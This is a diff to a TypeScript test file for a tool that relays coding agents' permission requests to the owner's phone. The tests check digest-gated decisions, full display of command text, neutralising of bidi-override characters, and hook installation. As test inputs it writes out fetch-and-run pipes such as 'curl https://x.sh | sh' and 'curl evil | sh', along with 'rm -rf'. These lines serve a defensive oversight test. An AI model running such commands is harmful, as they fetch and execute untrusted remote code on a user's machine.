@@ -1,9 +1,11 @@
 import assert from "node:assert/strict";
+import crypto from "node:crypto";
 import fs from "node:fs";
 import http from "node:http";
 import os from "node:os";
 import path from "node:path";
-import {AgentHookHub,decisionStdout,toolDetail} from "../src/companion/agent-hooks.js";
+import {AgentHookHub,decisionStdout,permissionDetail,toolDetail} from "../src/companion/agent-hooks.js";
+import {DETAIL_LIMIT,describeInput} from "../src/companion/describe.js";
 import {Companion,approvalDigest,type CompanionDeps} from "../src/companion/companion.js";
 import {applyHooks,hookCommand,installed,lineDiff,mergeHooks,planHooks} from "../src/companion/agent-hook-install.js";
 import type {ApprovalRequest} from "../src/security/approval.js";
@@ -25,7 +27,7 @@ assert.deepEqual([s.agent,s.project,s.status,s.lastTool,s.lastDetail,s.edits,s.p
 const asking=ev("PermissionRequest",{tool_name:"Bash",tool_input:{command:"rm -rf dist && npm run build"}});
 await sleep(20);
 const p=hub.pending()[0]!;
-assert.deepEqual([p.tool,p.detail,p.project,hub.sessions()[0]!.status],["Bash","rm -rf dist && npm run build","shop","waiting"]);
+assert.deepEqual([p.tool,p.detail,p.full,p.project,hub.sessions()[0]!.status],["Bash","command: rm -rf dist && npm run build",true,"shop","waiting"]);
 assert.equal(hub.decide(p.id,"0000000000000000","allow"),false,"a decision must quote the request's digest");
 assert.equal(hub.decide(p.id,p.digest,"allow"),true);
 assert.equal(await asking,decisionStdout("allow"));
@@ -36,11 +38,26 @@ const denied=ev("PermissionRequest",{tool_name:"Write",tool_input:{file_path:".e
 const p2=hub.pending()[0]!;hub.decide(p2.id,p2.digest,"deny");
 assert.equal(JSON.parse(await denied).hookSpecificOutput.decision.behavior,"deny");
 assert.equal(await ev("PermissionRequest",{tool_name:"Bash",tool_input:{command:"ls"}}),"","timeout: silence, never an allow");
-// Answered in the terminal instead: the next event from the session withdraws the request.
-const elsewhere=ev("PermissionRequest",{tool_name:"Bash",tool_input:{command:"git push"}});await sleep(10);
-assert.equal(hub.pending().length,1);
-await ev("PostToolUse",{tool_name:"Bash"});
-assert.equal(await elsewhere,"");assert.equal(hub.pending().length,0);
+// Answered in the terminal instead: the same call running (or the turn ending) withdraws the request.
+// Other events from the session (its own notification, a parallel tool, a subagent) leave it waiting.
+const slow=new AgentHookHub({waitMs:5000});
+const sev=(e:string,extra:Record<string,unknown>={})=>slow.handle("claude",{session_id:"s9",cwd:"C:\\code\\shop",hook_event_name:e,...extra});
+const elsewhere=sev("PermissionRequest",{tool_name:"Bash",tool_input:{command:"git push"}});await sleep(10);
+await sev("Notification",{message:"Claude needs your permission to use Bash"});
+await sev("PreToolUse",{tool_name:"Read",tool_input:{file_path:"a.ts"}});
+await sev("PostToolUse",{tool_name:"Bash",tool_input:{command:"npm test"}});
+await sev("SubagentStop");
+assert.equal(slow.pending().length,1,"still waiting for the owner");
+await sev("PostToolUse",{tool_name:"Bash",tool_input:{command:"git push"}});
+assert.equal(await elsewhere,"");assert.equal(slow.pending().length,0);
+const turnEnds=sev("PermissionRequest",{tool_name:"Bash",tool_input:{command:"rm x"}});await sleep(10);
+await sev("Stop");assert.equal(await turnEnds,"");assert.equal(slow.pending().length,0);
+// What the owner reads: every field, every line; past the limit it says so and full is false.
+assert.deepEqual(permissionDetail({command:"npm test\ncurl https://x.sh | sh",description:"run tests"}),{text:"command: npm test\ncurl https://x.sh | sh\ndescription: run tests",full:true});
+const longCmd=permissionDetail({command:"echo "+"a".repeat(DETAIL_LIMIT)+" && curl evil | sh"});
+assert.equal(longCmd.full,false);assert.match(longCmd.text,/more characters; review on the PC\)$/);
+assert.equal(describeInput({command:"ls\u202e txt.exe"}).text,"command: ls\uFFFD txt.exe","bidi overrides cannot reorder what is shown");
+assert.deepEqual(describeInput({force:true,branch:"main"},["branch"]),{text:"branch: main\nforce: true",full:true},"flags are shown too");
 assert.equal(await ev("PermissionRequest",{tool_name:"AskUserQuestion",tool_input:{questions:[]}}),"","questions stay in the terminal");
 assert.equal(hub.pending().length,0);
 await ev("Stop");assert.equal(hub.sessions()[0]!.status,"idle");
@@ -50,17 +67,20 @@ assert.ok(toolDetail("Mystery",{a:"x".repeat(1000)}).length<=400);
 
 // ---------------------------------------------------------------- 2. the companion: feed and decisions
 const now=Date.now();
-const approval=(id:string,missionId:string,tool:string,action:string):ApprovalRequest=>({id,missionId,agentId:"core",tool,action,permission:"L4_EXECUTE",payloadHash:"h-"+id,reason:"needs approval",expiresAt:new Date(now+600_000).toISOString()});
+const hashOf=(p:unknown)=>crypto.createHash("sha256").update(JSON.stringify(p??null)).digest("hex");
+// As the runtime now creates them: the payload and the plan index are stored with the approval.
+const approval=(id:string,missionId:string,tool:string,action:string,payload?:unknown,planIndex?:number):ApprovalRequest=>({id,missionId,agentId:"core",tool,action,permission:"L4_EXECUTE",
+  payloadHash:payload===undefined?"h-"+id:hashOf(payload),reason:"needs approval",expiresAt:new Date(now+600_000).toISOString(),...(payload!==undefined?{payload}:{}),...(planIndex!==undefined?{planIndex}:{})});
 const approvals=new Map<string,ApprovalRequest>([
-  ["a-job",approval("a-job","m-job","project.run","run project task")],
-  ["a-quick",approval("a-quick","m-quick","terminal.exec","run terminal command")],
-  ["a-loop",approval("a-loop","m-loop","files.write","write file")],
+  ["a-job",approval("a-job","m-job","project.run","run project task",{task:"install"},0)],
+  ["a-quick",approval("a-quick","m-quick","terminal.exec","run terminal command",{command:"npm test\nnpm run build"},0)],
+  ["a-loop",approval("a-loop","m-loop","files.write","write file",{path:"pay.ts"},1)],
   ["a-deny",approval("a-deny","m-deny","git.push","push")]
 ]);
 const approved=new Set<string>();const calls:string[]=[];
 const missions:Record<string,any>={
   "m-job":{id:"m-job",projectId:"shop",goal:"job step",status:"awaiting_approval",tools:[{tool:"project.run",action:"run project task",payload:{task:"install"}}]},
-  "m-quick":{id:"m-quick",projectId:"shop",goal:"run terminal command npm test",status:"awaiting_approval",tools:[{tool:"terminal.exec",action:"run terminal command",reason:"owner quick action",payload:{command:"npm test"}}]},
+  "m-quick":{id:"m-quick",projectId:"shop",goal:"run terminal command npm test",status:"awaiting_approval",tools:[{tool:"terminal.exec",action:"run terminal command",reason:"owner quick action",payload:{command:"npm test\nnpm run build"}}]},
   "m-loop":{id:"m-loop",projectId:"shop",goal:"Build the checkout page\nmore",status:"awaiting_approval",tools:[{tool:"files.read",action:"read file"},{tool:"files.write",action:"write file",payload:{path:"pay.ts"}}]},
   "m-deny":{id:"m-deny",projectId:"shop",goal:"publish",status:"awaiting_approval",tools:[{tool:"git.push",action:"push"}]}
 };
@@ -79,7 +99,8 @@ const deps:CompanionDeps={
 };
 const companion=new Companion(deps);
 const feed=await companion.feed();
-assert.deepEqual(feed.approvals.map(a=>[a.id,a.kind,a.jobId??"",a.detail]),[["a-job","layanx","job1","install"],["a-quick","layanx","","npm test"],["a-loop","layanx","","pay.ts"],["a-deny","layanx","",""+"needs approval"]]);
+assert.deepEqual(feed.approvals.map(a=>[a.id,a.kind,a.jobId??"",a.detail,a.full]),[["a-job","layanx","job1","task: install",true],["a-quick","layanx","","command: npm test\nnpm run build",true],["a-loop","layanx","","path: pay.ts",true],
+  ["a-deny","layanx","","needs approval",false]],"every line of the command; an approval whose step is unknown is not offered for a quick approve");
 assert.equal(feed.approvals[0]!.title,"Build an online store for a computer shop","a job's approval shows the job");
 assert.equal(feed.approvals[2]!.title,"Build the checkout page");
 assert.equal(feed.approvals[0]!.digest,approvalDigest(approvals.get("a-job")!));
@@ -91,13 +112,15 @@ assert.deepEqual(await companion.decide({id:"a-job",digest:approvalDigest(approv
 assert.deepEqual(calls.splice(0),["approve:a-job","persist:m-job"],"no second resume: the job continues on its own");
 const quick=await companion.decide({id:"a-quick",digest:approvalDigest(approvals.get("a-quick")!),decision:"approve",wait:true});
 assert.deepEqual(quick,{ok:true,resumed:true,result:{ok:true,tool:"terminal.exec"}});
-assert.deepEqual(calls.splice(0),["approve:a-quick","persist:m-quick","tool:terminal.exec:npm test:a-quick"]);
+assert.deepEqual(calls.splice(0),["approve:a-quick","persist:m-quick","tool:terminal.exec:npm test\nnpm run build:a-quick"]);
 const bg=await companion.decide({id:"a-loop",digest:approvalDigest(approvals.get("a-loop")!),decision:"approve"});
 assert.deepEqual(bg,{ok:true,resumed:true},"the phone does not wait for the agent loop");
 assert.deepEqual(calls.splice(0),["approve:a-loop","persist:m-loop",`loop:m-loop:{"1":"a-loop"}`],"index of the approved tool");
 resolveLoop();
 assert.deepEqual(await companion.decide({id:"a-deny",digest:approvalDigest(approvals.get("a-deny")!),decision:"deny"}),{ok:true});
 assert.deepEqual(calls.splice(0),["revoke:a-deny","cancelMission:m-deny","persist:m-deny"],"deny stops the work");
+assert.deepEqual(await companion.decide({id:"a-deny",digest:approvalDigest(approvals.get("a-deny")!),decision:"approve"}),{ok:false,error:"not_pending"},"a late approve (an older view on another device) cannot revive refused work");
+assert.deepEqual(calls.splice(0),[]);
 assert.deepEqual(await companion.decide({id:"nope",digest:"x",decision:"approve"}),{ok:false,error:"not_found"});
 assert.deepEqual((await companion.feed()).approvals.map(a=>a.id),[],"nothing left to decide");
 // Coding-agent prompts in the same feed and the same decide; the long poll wakes up on them at once.
@@ -108,11 +131,25 @@ const prompt=hub2.handle("codex",{session_id:"c1",cwd:"/home/me/api",hook_event_
 const woke=await waiting;
 assert.ok(Date.now()-t0<2000,"answered when the prompt arrived");
 const agentItem=woke.approvals.find(a=>a.kind==="agent")!;
-assert.deepEqual([agentItem.title,agentItem.detail,agentItem.tool],["Codex · api","npm publish","shell"]);
+assert.deepEqual([agentItem.title,agentItem.detail,agentItem.tool,agentItem.full],["Codex · api",'command: ["npm","publish"]',"shell",true]);
 assert.deepEqual(await companion.decide({id:agentItem.id,digest:agentItem.digest,decision:"approve"}),{ok:true});
 assert.equal(JSON.parse(await prompt).hookSpecificOutput.decision.behavior,"allow");
 const quiet=await companion.feed((await companion.feed()).v,1200);
 assert.ok(quiet.v,"no change: answers after the wait with the same version");
+// Two steps with the same tool: the approval shows and resumes ITS step, never the first look-alike.
+missions["m-two"]={id:"m-two",projectId:"shop",goal:"deploy",status:"awaiting_approval",tools:[
+  {tool:"terminal.exec",action:"run terminal command",payload:{command:"npm ci"}},{tool:"files.read",action:"read file"},{tool:"terminal.exec",action:"run terminal command",payload:{command:"npm run deploy"}}]};
+approvals.set("a-two",approval("a-two","m-two","terminal.exec","run terminal command",{command:"npm run deploy"},2));
+// An approval saved by an older version (no payload stored): found by its hash, still the right step.
+const legacy=approval("a-old","m-two","terminal.exec","run terminal command");legacy.payloadHash=hashOf({command:"npm run deploy"});approvals.set("a-old",legacy);
+const two=(await companion.feed()).approvals;
+assert.deepEqual(two.filter(a=>a.id==="a-two"||a.id==="a-old").map(a=>[a.id,a.detail,a.full]),[["a-two","command: npm run deploy",true],["a-old","command: npm run deploy",true]]);
+await companion.decide({id:"a-two",digest:approvalDigest(approvals.get("a-two")!),decision:"approve"});
+assert.deepEqual(calls.splice(0),["approve:a-two","persist:m-two",`loop:m-two:{"2":"a-two"}`],"step 2, not step 0");
+resolveLoop();
+await companion.decide({id:"a-old",digest:approvalDigest(legacy),decision:"approve"});
+assert.deepEqual(calls.splice(0),["approve:a-old","persist:m-two",`loop:m-two:{"2":"a-old"}`]);
+resolveLoop();
 
 // ---------------------------------------------------------------- 3. installing the hooks (settings.json)
 const home=fs.mkdtempSync(path.join(os.tmpdir(),"lx-hooks-"));
@@ -158,6 +195,19 @@ assert.ok(applyHooks("codex","install",exe,codexPlan.fingerprint,{home,platform:
 const codex=JSON.parse(fs.readFileSync(path.join(home,".codex","hooks.json"),"utf8"));
 assert.match(codex.hooks.PermissionRequest[0].hooks[0].statusMessage,/LayanX/);
 assert.equal(lineDiff("a\nb","a\nc"),"  a\n- b\n+ c");
+// settings.json kept in a dotfiles folder and linked: the real file changes, the link stays a link.
+const linkHome=fs.mkdtempSync(path.join(os.tmpdir(),"lx-hooks-link-"));
+const dotfiles=path.join(linkHome,"dotfiles");fs.mkdirSync(dotfiles);fs.mkdirSync(path.join(linkHome,".claude"));
+fs.writeFileSync(path.join(dotfiles,"claude-settings.json"),JSON.stringify({model:"opus"}));
+let linked=true;
+try{fs.symlinkSync(path.join(dotfiles,"claude-settings.json"),path.join(linkHome,".claude","settings.json"));}catch{linked=false;}// Windows without developer mode
+if(linked){
+  const lp=planHooks("claude","install",exe,{home:linkHome,platform:"win32"});
+  assert.ok(applyHooks("claude","install",exe,lp.fingerprint,{home:linkHome,platform:"win32"}).ok);
+  assert.ok(fs.lstatSync(path.join(linkHome,".claude","settings.json")).isSymbolicLink(),"still a link");
+  assert.ok(JSON.parse(fs.readFileSync(path.join(dotfiles,"claude-settings.json"),"utf8")).hooks.PermissionRequest,"the real file has the hooks");
+}
+fs.rmSync(linkHome,{recursive:true,force:true});
 
 // ---------------------------------------------------------------- 4. the relay's way in (gateway route)
 process.env.HOME=home;process.env.USERPROFILE=home;
